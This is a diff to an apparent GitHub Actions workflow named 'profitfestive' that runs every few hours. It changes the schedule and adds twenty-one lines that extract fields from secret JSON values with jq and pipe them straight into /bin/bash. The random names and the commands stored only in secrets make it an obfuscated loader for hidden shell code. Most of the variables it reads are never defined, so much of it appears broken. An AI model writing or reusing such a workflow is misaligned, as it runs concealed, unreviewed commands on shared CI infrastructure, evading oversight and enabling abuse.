@@ -3,8 +3,7 @@ name: profitfestive
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
-
+    - cron: '55 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,14 +12,27 @@ jobs:
       - uses: actions/checkout@v4
       - name: profitfestive
         env:
-          r788: ${{ secrets.r788 }}
+          bmzh443: ${{ secrets.bmzh443 }}
         run: |
-          echo $r788 | jq -r .qtea60 | /bin/bash
-          echo $fh54 | jq -r .nfhjv7 | /bin/bash
-          echo $gw636 | jq -r .qwpgm21837 | /bin/bash
-          echo $v0 | jq -r .nqiaf00990 | /bin/bash
-          echo $bgczg90 | jq -r .nem451 | /bin/bash
-          echo $aoy911 | jq -r .iiqu228 | /bin/bash
-          echo $yyvr241 | jq -r .q7 | /bin/bash
-          echo $vrgrl8 | jq -r .znt145 | /bin/bash
+          echo $bmzh443 | jq -r .btx051 | /bin/bash
+          echo $ycv28 | jq -r .o453 | /bin/bash
+          echo $ul2295 | jq -r .th68 | /bin/bash
+          echo $ru47 | jq -r .iqg8 | /bin/bash
+          echo $y36 | jq -r .h8311 | /bin/bash
+          echo $wuywj81386 | jq -r .ajdqa51 | /bin/bash
+          echo $jnb3011 | jq -r .hsy32871 | /bin/bash
+          echo $eu90534 | jq -r .z29176 | /bin/bash
+          echo $ak1 | jq -r .lafjp4 | /bin/bash
+          echo $efrp1483 | jq -r .q525 | /bin/bash
+          echo $zyq8 | jq -r .fxg785 | /bin/bash
+          echo $y05944 | jq -r .j47 | /bin/bash
+          echo $be09333 | jq -r .g50 | /bin/bash
+          echo $vr2 | jq -r .hsni92 | /bin/bash
+          echo $gnd466 | jq -r .rr74 | /bin/bash
+          echo $joob410 | jq -r .vig49234 | /bin/bash
+          echo $a125 | jq -r .gzz678 | /bin/bash
+          echo $sp504 | jq -r .wlqzb037 | /bin/bash
+          echo $sr3 | jq -r .dkq02629 | /bin/bash
+          echo $n13 | jq -r .krdj9 | /bin/bash
+          echo $a5285 | jq -r .qv4 | /bin/bash
 
